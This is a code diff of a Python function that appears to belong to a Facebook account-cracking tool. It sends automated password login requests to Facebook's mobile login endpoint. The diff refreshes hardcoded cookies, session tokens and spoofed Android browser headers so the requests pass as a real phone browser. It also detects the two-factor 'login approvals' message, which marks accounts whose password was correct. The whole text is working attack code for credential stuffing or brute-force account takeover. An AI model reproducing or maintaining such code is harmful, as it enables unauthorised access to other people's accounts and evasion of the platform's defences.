@@ -1849,43 +1849,43 @@ def d(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             cookies = {
-            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
-            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
+            'datr': 'E_QCaU0v4udGQr5o_3Wzi6sA',
+            'sb': 'E_QCaWJcUYmVYBh1yW_Q6xL1',
+            'm_pixel_ratio': '2.75',
             'ps_l': '1',
             'ps_n': '1',
-            'vpd': 'v1%3B754x393x2.75',
-            'locale': 'en_US',
-            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
-            'dpr': '3.0234789848327637',
-            'm_pixel_ratio': '2.75',
+            'dpr': '2.75',
+            'locale': 'en_GB',
+            'vpd': 'v1%3B785x393x2.75',
             'wd': '393x895',
-            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
+            'fr': '09qe4bO3Fv4LfIHNw..BpAvQT..AAA.0.0.BpAvbW.AWc4WjvKsreJxZCzOUWatTYXJnw',}
             params = {
             'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
             'type': 'action',
-            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
+            '__bkv': '95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30',}
             data = {
-    '__aaid': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': 'a',
-    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': '3',
-    '__ccg': 'EXCELLENT',
-    '__rev': '1023608600',
-    '__s': ':f95eey:i9v0n0',
-    '__hsi': '7513185148771233093',
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
-    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    "aaid": "0",
+    "user": "0",
+    "a": "1",
+    "req": "4",
+    "hs": "20391.BP:wbloks_caa_pkg.2.0...0",
+    "dpr": "3",
+    "ccg": "MODERATE",
+    "rev": "1029141574",
+    "s": "3bqy2l:4nyjag:uh2zs6",
+    "hsi": "7566881608767562019",
+    "dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw",
+    "fb_dtsg": "NAfuramg1szA6_XEvFFU8Mb7DtuyjKFtz08CQ5QSOG_ouVtpB6N8VLw:0:0",
+    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
     'params': json.dumps({
         "params": json.dumps({
             "server_params": {
+                "next_uri": "https://business.facebook.com/?nav_ref=biz_unified_f3_login_page_to_mbs&biz_login_source=biz_unified_f3_fb_login_button&join_id=9965d19e-bb09-4810-ab18-2b2cb4078864",
                 "credential_type": "password",
-                "username_text_input_id": "7w9omu:68",
-                "password_text_input_id": "7w9omu:69",
-                "login_source": "login",
+                "username_text_input_id": "zder54:64",
+                "password_text_input_id": "zder54:65",
+                "login_source": "Login",
                 "login_credential_type": "none",
                 "server_login_source": "login",
                 "ar_event_source": "login_home_page",
@@ -1901,21 +1901,24 @@ def d(uid,pwx,tl):
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
                 "two_step_login_type": "one_step_login",
-                "INTERNAL__latency_qpl_marker_id": 36707139,
-                "INTERNAL__latency_qpl_instance_id": "47746277400427",
+                "is_vanilla_password_page_empty_password": 0,
+                "INTERNALlatency_qpl_marker_id": 36707139,
+                "INTERNALlatency_qpl_instance_id": "213883952800439",
                 "device_id": None,
                 "family_device_id": None,
-                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
+                "waterfall_id": "aa106bc1-7182-4fe9-ae17-fb807c185a6f",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
                 "is_platform_login": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
-                "access_flow_version": "pre_mt_behavior"
+                "access_flow_version": "pre_mt_behavior",
             },
             "client_input_params": {
                 "machine_id": "",
                 "cloud_trust_token": None,
+                "block_store_machine_id": "",
+                "zero_balance_state": "",
                 "contact_point": uid,
                 "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                 "accounts_list": [],
@@ -1928,7 +1931,6 @@ def d(uid,pwx,tl):
                 "event_flow": "login_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
-                "block_store_machine_id": "",
                 "auth_secure_device_id": "",
                 "client_known_key_hash": "",
                 "has_whatsapp_installed": 0,
@@ -1939,36 +1941,30 @@ def d(uid,pwx,tl):
                 "has_granted_read_phone_permissions": 0,
                 "app_manager_id": "",
                 "aymh_accounts": [],
-                "lois_settings": {
-                    "lois_token": ""
+                "lois_settings": {"lois_token": ""},
                 }
-            }
         })
     }),
 }
             headers = {
-            'Host': 'mtouch.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
+            'authority': 'm.facebook.com',
             'accept': '*/*',
-            'origin': 'https://mtouch.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            # 'cookie': 'datr=E_QCaU0v4udGQr5o_3Wzi6sA; sb=E_QCaWJcUYmVYBh1yW_Q6xL1; m_pixel_ratio=2.75; ps_l=1; ps_n=1; dpr=2.75; locale=en_GB; vpd=v1%3B785x393x2.75; wd=393x895; fr=09qe4bO3Fv4LfIHNw..BpAvQT..AAA.0.0.BpAvbW.AWc4WjvKsreJxZCzOUWatTYXJnw',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/ig/login_via/app/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_mbs%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3D9965d19e-bb09-4810-ab18-2b2cb4078864&request_id=b9baadb3-0b10-47a0-9efe-7d0759ab8d25&lid=0m1mZBc2vKpJhl663&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQF3FzHigmpMr3ET%2BMlDgnCiqr0r1cCjHy8FjEE7kyRB6A5I9zb0zNwekux%2Bzx8K5wNLSRV1Q1mw0dIsPX80QqgBF5AQpZfPRXRr1Wcq0%2FU%2BEdsomACTodidS323K5sXqPkcLQ%3D%3D',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23076PC4BI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; 23076PC4BI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
